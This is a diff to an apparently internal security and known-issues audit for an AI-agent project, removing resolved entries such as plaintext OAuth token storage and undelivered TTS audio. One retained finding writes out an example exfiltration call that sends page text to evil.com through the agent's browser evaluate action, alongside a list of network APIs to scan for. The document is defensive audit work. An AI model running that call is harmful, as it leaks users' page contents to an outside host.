@@ -27,11 +27,6 @@ Last updated: 2026-02-13 (Post-Phase 4 Audit)
 - **Description**: The browser tool's `evaluate` action runs arbitrary JavaScript in the page via CDP. This allows `fetch('https://evil.com', {body: document.body.innerText})` for data exfiltration. The browser tool has no deterministic risk classification (falls through to LLM). Once L2-approved, the expression content is not inspected.
 - **Resolution**: Add deterministic classification (`browser:evaluate` = L2 minimum). Scan expression for network APIs (`fetch`, `XMLHttpRequest`, `WebSocket`, `navigator.sendBeacon`).
 
-### Google OAuth Tokens Stored in Plaintext
-- **Files**: `src/integrations/google/auth.ts`
-- **Description**: The `TokenStore` stores refresh tokens and access tokens without encryption. Refresh tokens are long-lived credentials granting indefinite Gmail/Calendar access. The included `createInMemoryTokenStore()` is not persisted, but if backed by SQLite the tokens would be plaintext in the DB.
-- **Resolution**: Encrypt tokens at rest using `crypto.createCipheriv()` with a key derived from user config.
-
 ### Multiple Important Tools Lack Deterministic Risk Classification
 - **Files**: `src/approval/risk-classifier.ts`
 - **Description**: `write_file`, `delete_file`, `git_commit`, `cron`, `browser`, `skill`, `claude_code`, `memory_write` all fall through to the LLM classifier (Qwen3 8B) instead of having deterministic rules. Suggested levels: `delete_file`=L2, `write_file`=L1, `git_commit`=L2, `claude_code`=L1, `cron:create`=L1, `browser:evaluate`=L2, `skill:install`=L2, `memory_write`=L1.
@@ -70,11 +65,6 @@ Last updated: 2026-02-13 (Post-Phase 4 Audit)
 - **Impact**: MCP outputs (highest risk) are protected. Native tool outputs are lower risk since they come from trusted local operations. The system prompt instruction provides soft defense for the LLM itself.
 - **Resolution**: Either wrap all native tool outputs in `<tool_output>` tags in `tool-registry.ts` execute path, or document this as a 2-layer defense (MCP sanitization + system prompt instructions).
 
-### TTS Audio Never Delivered to User
-- **Files**: `src/tools/tts.ts`, `src/orchestrator/agent-loop.ts`
-- **Description**: The `tts_speak` tool synthesizes audio and stores it via `getLastSynthesizedAudio()`, but no code path ever calls `platform.sendAudio()` to deliver it. The companion adapter is the only platform implementing `sendAudio`, yet it's never invoked. Audio synthesis succeeds but the result is silently discarded.
-- **Resolution**: After TTS tool execution (via `onStepFinish` or post-step hook), check `getLastSynthesizedAudio()` and call `platform.sendAudio()` if available.
-
 ### Multi-Agent Executor Ignores agentId
 - **Files**: `src/index.ts`, `src/agents/hub.ts`
 - **Description**: The agent hub executor callback discards `_agentId`, meaning all specialist agents use the same orchestrator model, system prompt, and tools as the hub. Multi-agent routing differentiates by conversation isolation only, not by actual agent behavior.
@@ -95,13 +85,8 @@ Last updated: 2026-02-13 (Post-Phase 4 Audit)
 - **Description**: No test verifies the promise behavior when `approvalTimeoutMs` expires without user action.
 - **Impact**: Low — the feature likely works but is not regression-protected.
 
-### Pairing Code Expiry Not Tested
-- **Files**: `src/companion/pairing.test.ts`
-- **Description**: The "rejects expired code" test only verifies non-expired behavior. It never advances time past the 5-minute TTL. Requires `mock.timers` (Node 22+) or clock injection.
-- **Impact**: Low — expiry logic is simple (`Date.now() > expiresAt`) but not tested.
-
 ### ~80 Tool Strings Not Using i18n t() Function
-- **Files**: `src/tools/companion.ts`, `src/tools/webhook.ts`, `src/tools/skill.ts`, `src/tools/smart-home.ts`, `src/tools/gmail.ts`, `src/tools/calendar.ts`, `src/tools/process.ts`, `src/tools/cron.ts`
+- **Files**: `src/tools/webhook.ts`, `src/tools/skill.ts`, `src/tools/process.ts`, `src/tools/cron.ts`
 - **Description**: Tool validation and response strings (`"Error: 'x' is required for y"`, `"Webhook created: ..."`, etc.) are hardcoded in English instead of using `t()`. Primarily consumed by the LLM orchestrator, not directly shown to users, but inconsistent with the i18n architecture.
 - **Impact**: German-locale users see English tool error responses mixed with German UI text.
 
@@ -121,11 +106,6 @@ Last updated: 2026-02-13 (Post-Phase 4 Audit)
 - **Files**: `src/automation/cron-parser.ts`
 - **Description**: Standard cron has undefined behavior when both day-of-week and day-of-month are specified (AND vs OR semantics). Our parser treats them as AND, which may surprise users coming from crontab (which uses OR).
 - **Impact**: Minimal — edge case, documented behavior differs from some cron implementations.
-
-### ElevenLabs TTS Cache Has No Disk Persistence
-- **Files**: `src/voice/synthesizer.ts`
-- **Description**: The LRU TTS cache is in-memory only. Restarting the process loses all cached audio.
-- **Impact**: Minimal — results in re-synthesis on restart. Cost impact depends on usage patterns.
 
 ### i18n Falls Back Silently to German
 - **Files**: `src/i18n/index.ts`
